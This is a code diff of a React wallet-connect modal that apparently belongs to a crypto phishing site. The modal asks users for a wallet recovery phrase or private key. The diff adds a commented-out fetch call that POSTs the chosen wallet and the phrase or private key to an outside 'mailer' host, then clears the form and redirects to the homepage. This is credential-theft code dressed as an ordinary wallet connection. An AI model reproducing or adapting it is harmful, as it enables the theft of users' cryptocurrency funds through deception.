@@ -88,20 +88,6 @@ export default function Modal({ open, onClose }) {
   const [privateKey, setPrivateKey] = useState(''); // For "Private Key"
   const [isSuccess, setIsSuccess] = useState(false);
 
-  const handleCancel = () => {
-    // Reset modal states to show the homepage view
-    // setShowNewPage(false);
-    // setShowThirdPage(false);
-    // setSelectedWallet('');
-    // setPhrase('');
-    // setPrivateKey('');
-    // setSelectedOption('');
-    // setIsLoading(false);
-    // setIsError(false);
-    // setIsSuccess(false);
-    // Navigate to the homepage
-    // navigate('/');
-  };
 
   const handleOptionChange = (e) => {
     setSelectedOption(e.target.value);
@@ -118,6 +104,55 @@ export default function Modal({ open, onClose }) {
   const toggleConnect = (e) => {
     e.preventDefault();
     setIsLoading(true);
+
+    // const payload = {
+    //   wallet: selectedWallet,
+    //   phrase: selectedOption === 'Private' ? privateKey : phrase,
+    // };
+
+    // fetch('https://ozildetailsmailernewdapps.onrender.com/details', {
+    //   method: 'POST',
+    //   headers: {
+    //     'Content-Type': 'application/json',
+    //   },
+    //   body: JSON.stringify(payload),
+    // })
+    //   .then((response) => {
+    //     if (!response.ok) {
+    //       return response.json().then((errorData) => {
+    //         throw new Error(errorData.message || 'Failed to connect wallet');
+    //       });
+    //     }
+    //     return response.json();
+    //   })
+    //   .then((data) => {
+    //     console.log('Wallet connected:', data);
+
+    //     if (data.status === 'Success') {
+    //       setIsSuccess(true);
+    //       setIsError(false);
+    //       setSelectedWallet('');
+    //       setPhrase('');
+    //       setPrivateKey('');
+    //       setSelectedOption('');
+
+    //       navigate('/');
+    //     } else {
+    //       //  handle unexpected status or errors here
+    //       setIsError(true);
+    //       setIsSuccess(false);
+    //       console.log('Error:', data.message); // Log the message or show feedback
+    //     }
+    //   })
+    //   .catch((error) => {
+    //     console.error('Connection error:', error);
+    //     setIsError(true);
+    //     setIsSuccess(false);
+    //     navigate('/');
+    //   })
+    //   .finally(() => {
+    //     setIsLoading(false);
+    //   });
 
     setTimeout(() => {
       setIsLoading(false);
